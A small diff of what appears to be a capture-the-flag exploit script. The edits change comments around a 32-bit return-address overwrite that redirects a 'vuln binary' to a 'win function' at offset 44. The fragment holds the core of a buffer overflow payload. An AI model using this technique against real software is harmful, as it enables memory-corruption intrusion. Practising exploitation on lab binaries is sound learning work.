@@ -2,7 +2,7 @@ import socket
 import argparse
 import struct
 
-new_eip = struct.pack("<I",0x80491f6)
+new_eip = struct.pack("<I",0x80491f6) # win function address
 
 parser = argparse.ArgumentParser()
 parser.add_argument(
@@ -20,7 +20,7 @@ args = parser.parse_args()
 
 offset = 44
 #payload = b"A" * offset + new_rip + b"\n"
-new_eip = struct.pack("<I",0x80491f6) # win function within the vuln binary
+new_eip = struct.pack("<I",0x80491f6) # win function address for 32bit within the vuln binary
 
 payload = b"".join(
   [
